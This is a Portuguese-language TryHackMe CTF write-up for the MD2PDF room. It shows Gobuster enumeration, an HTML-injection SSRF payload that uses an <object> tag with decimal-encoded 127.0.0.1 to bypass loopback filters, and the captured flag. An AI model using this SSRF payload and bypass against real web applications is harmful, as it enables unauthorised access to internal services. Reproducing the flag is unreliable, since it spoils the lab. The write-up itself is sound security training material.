# 🔍 MD2PDF — CTF Writeup
### TryHackMe | Web Exploitation | Reconhecimento · Enumeração Web · SSRF via HTML Injection

---

| **Analista**          | Mauricio Robert                                                                        |
|-----------------------|----------------------------------------------------------------------------------------|
| **Organização**       | Faculdade Impacta                                                                      |
| **Data do Relatório** | 24/06/2026                                                                             |
| **Data do Pentest**   | 24/06/2026                                                                             |
| **Alvo**              | `10.64.146.57` — TryHackMe · MD2PDF                                                   |
| **Classificação**     | CONFIDENCIAL                                                                           |
| **Ferramentas**       | Gobuster 3.8.2 · Brave Browser · HTML payload manual                                  |
| **Plataforma**        | TryHackMe — Web Exploitation                                                           |

---

## 🔍 Resumo Executivo

Este relatório documenta o comprometimento da máquina **MD2PDF** (TryHackMe) por meio de uma vulnerabilidade de **Server-Side Request Forgery (SSRF)** explorável na funcionalidade de conversão de Markdown para PDF. A aplicação renderiza HTML arbitrário submetido pelo usuário sem sanitização, permitindo a injeção de uma tag `<object>` com referência a `localhost:5000/admin` — endpoint restrito inacessível externamente (HTTP 403). O bypass do filtro de loopback foi realizado representando `127.0.0.1` em notação decimal inteira (`2130706433`), forçando o servidor a realizar a requisição internamente e retornar o conteúdo da página de administração no PDF gerado. Nenhuma CVE foi necessária — o comprometimento dependeu exclusivamente de **ausência de sanitização de entrada e controle inadequado de requisições internas**. A flag foi capturada com sucesso, confirmando acesso à rota administrativa protegida.

---

## 🛠 Ferramentas Utilizadas

| Ferramenta          | Versão  | Finalidade                                                                              |
|---------------------|---------|-----------------------------------------------------------------------------------------|
| **Gobuster**        | 3.8.2   | Enumeração de diretórios e arquivos web (wordlist `common.txt`, extensões php,txt,js)   |
| **Brave Browser**   | —       | Interação com a aplicação web e submissão do payload HTML                               |
| **HTML payload**    | manual  | Tag `<object>` com SSRF apontando para `http://2130706433:5000/admin`                  |

---

## 📋 Fases de Comprometimento

### FASE 1 — Reconhecimento: Enumeração Web com Gobuster

> **Gobuster 3.8.2 · Alvo: `http://10.64.146.57/`**

**Solução:** Enumeração de diretórios com Gobuster v3.8.2 usando a wordlist `common.txt` do SecLists com extensões `php`, `txt` e `js`, 100 threads e timeout de 10 segundos.

**Comando executado:**
```bash
gobuster dir -u http://10.64.146.57/ \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt \
  -t 100 -x php,txt,js
```

**Resultado:**
```
admin    (Status: 403) [Size: 166]
Progress: 19004 / 19004 (100.00%)
Finished
```

O Gobuster identificou o endpoint `/admin` retornando **HTTP 403 Forbidden**. Ao acessar `http://10.64.146.57/admin` pelo browser, a aplicação exibiu a mensagem:

```
Forbidden
This page can only be seen internally (localhost:5000)
```

Isso confirmou a existência de uma rota administrativa restrita ao loopback (`localhost:5000`) — inacessível diretamente de fora, mas potencialmente alcançável via **SSRF** caso a aplicação realizasse requisições internas com base em entrada do usuário.


![Gobuster](/CTFs/MD2PDF/images/Admin_page.png)

---

### FASE 2 — Análise da Aplicação: Identificação do Vetor SSRF

> **Brave Browser · `http://10.64.146.57`**

A aplicação **MD2PDF** oferece uma caixa de texto onde o usuário submete conteúdo em Markdown, que é convertido para PDF pelo servidor. Ao testar a submissão de HTML puro no campo de entrada, verificou-se que a aplicação **não sanitiza a entrada** — renderizando diretamente o HTML submetido no PDF gerado.

**Hipótese de ataque:** Injetar uma tag HTML que force o servidor a buscar um recurso interno (`localhost:5000/admin`) durante a conversão, incluindo o conteúdo retornado no PDF — caracterizando um ataque de **Server-Side Request Forgery (SSRF)**.

**Obstáculo identificado:** Submeter `http://localhost:5000/admin` ou `http://127.0.0.1:5000/admin` diretamente poderia estar bloqueado por filtros de entrada que detectam strings como `localhost` ou `127.0.0.1`.

**Solução de bypass:** Representar o endereço `127.0.0.1` em **notação decimal inteira**:

```
127.0.0.1 → 2130706433
```

A conversão é direta: cada octeto é deslocado em 8 bits e somado:
```
(127 × 16777216) + (0 × 65536) + (0 × 256) + 1 = 2130706433
```

A URL resultante `http://2130706433:5000/admin` aponta para o mesmo endereço de loopback, mas evita correspondência com filtros baseados em strings literais.

---

### FASE 3 — Exploração: Injeção de Payload SSRF + Captura da Flag

> **Brave Browser · MD2PDF · payload HTML**

**Payload utilizado:**
```html
<html>
  <body>
    <object data="http://2130706433:5000/admin"></object>
  </body>
</html>
```

O payload foi submetido no campo de entrada da aplicação MD2PDF e o botão **"Convert to PDF"** foi acionado. O servidor processou o HTML, realizou internamente uma requisição HTTP GET para `http://127.0.0.1:5000/admin` (interpretando o IP decimal), e incorporou o conteúdo retornado ao PDF gerado.

**Resultado:** O PDF renderizado exibiu o conteúdo da página de administração restrita, contendo a flag:

```
flag{1f4a2b6ffcaf4707c43885d704eaee4b}
```

> 🚩 **FLAG CAPTURADA: `flag{1f4a2b6ffcaf4707c43885d704eaee4b}`**

![Flag](/CTFs/MD2PDF/images/Flag.png)

---

## ⛓ Linha do Tempo do Comprometimento

```
[FASE 1] — RECONHECIMENTO (Gobuster 3.8.2)
    gobuster dir -u http://10.64.146.57/ -w common.txt -t 100 -x php,txt,js
    Resultado: /admin → (Status: 403) [Size: 166]
    Mensagem: "This page can only be seen internally (localhost:5000)"
    ↓
[FASE 2] — ANÁLISE DA APLICAÇÃO
    Aplicação MD2PDF renderiza HTML arbitrário sem sanitização
    Rota /admin acessível apenas via loopback (localhost:5000)
    Vetor identificado: SSRF via tag <object>
    Bypass: 127.0.0.1 → 2130706433 (notação decimal inteira)
    ↓
[FASE 3] — EXPLORAÇÃO (HTML payload + MD2PDF)
    Payload: <object data="http://2130706433:5000/admin"></object>
    Servidor realizou GET interno para localhost:5000/admin
    PDF gerado contendo o conteúdo da página admin
    FLAG CAPTURADA: flag{1f4a2b6ffcaf4707c43885d704eaee4b} ✓
    ↓
[FIM] — OBJETIVO CONCLUÍDO
    Página de administração restrita acessada via SSRF
```

---

## 🗺 Mapeamento Investigativo

| Fase | Ferramenta/Técnica | Achado |
|------|--------------------|--------|
| Reconhecimento | Gobuster 3.8.2 | `/admin` (HTTP 403) — restrito a `localhost:5000` |
| Análise | Browser (inspeção manual) | Aplicação renderiza HTML arbitrário sem sanitização |
| Exploração | HTML `<object>` + IP decimal | SSRF: servidor buscou `localhost:5000/admin` internamente |
| Captura | PDF gerado pela aplicação | Flag exibida no PDF: `flag{1f4a2b6ffcaf4707c43885d704eaee4b}` |

---

## 🚨 Artefatos e Indicadores Identificados

| Tipo | Indicador | Contexto |
|------|-----------|----------|
| Alvo | `10.64.146.57` | Máquina MD2PDF (TryHackMe) |
| Endpoint restrito | `http://10.64.146.57/admin` | HTTP 403 — acessível apenas via loopback |
| Serviço interno | `localhost:5000/admin` | Servidor Flask/interno expondo rota administrativa |
| Vetor de ataque | Tag `<object data="...">` | HTML injection sem sanitização no conversor MD→PDF |
| Bypass de filtro | `2130706433` | Representação decimal de `127.0.0.1` |
| Payload completo | `<object data="http://2130706433:5000/admin"></object>` | Força requisição interna via SSRF |
| Flag capturada | `flag{1f4a2b6ffcaf4707c43885d704eaee4b}` | Retornada pelo endpoint `/admin` no PDF gerado |
| Técnica (MITRE ATT&CK) | `T1190` | Exploit Public-Facing Application |
| Técnica (MITRE ATT&CK) | `T1083` | File and Directory Discovery (enumeração web) |
| CWE | `CWE-918` | Server-Side Request Forgery (SSRF) |

---

## ✅ Resumo das Flags

| # | Objetivo | Flag |
|---|----------|------|
| 🚩 flag | Acessar a página de administração restrita e extrair a flag | `flag{1f4a2b6ffcaf4707c43885d704eaee4b}` |

---

## 📚 Referências

- [TryHackMe — MD2PDF](https://tryhackme.com/room/md2pdf)
- [Gobuster — OJ Reeves](https://github.com/OJ/gobuster)
- [PortSwigger — Server-Side Request Forgery (SSRF)](https://portswigger.net/web-security/ssrf)
- [PayloadsAllTheThings — SSRF Bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- [MITRE ATT&CK T1190 — Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)
- [CWE-918 — Server-Side Request Forgery (SSRF)](https://cwe.mitre.org/data/definitions/918.html)

---